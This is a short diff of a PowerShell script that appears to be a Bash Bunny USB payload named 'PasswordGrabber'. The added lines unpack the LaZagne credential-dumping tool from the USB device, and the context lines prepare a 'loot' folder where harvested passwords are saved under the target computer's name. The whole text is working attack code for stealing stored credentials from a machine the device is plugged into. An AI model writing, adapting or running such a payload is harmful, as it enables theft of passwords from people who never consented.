@@ -1,3 +1,6 @@
+$zip = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools\laZagne.zip');
+$unzippath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools');
+Expand-Archive -Path $zip -DestinationPath $unzippath
 $dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\PasswordGrabber')
 $filter = 'password_'+ $env:COMPUTERNAME
 $filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
